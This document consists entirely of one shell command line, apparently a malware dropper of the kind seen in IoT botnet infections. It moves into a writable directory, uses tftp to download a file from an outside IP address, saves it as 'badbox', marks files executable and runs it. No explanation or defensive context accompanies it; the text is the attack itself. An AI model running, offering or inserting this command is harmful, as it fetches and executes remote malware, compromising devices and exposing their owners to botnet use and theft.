cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 163.172.104.150;cat sh >badbox;chmod +x *;./badbox
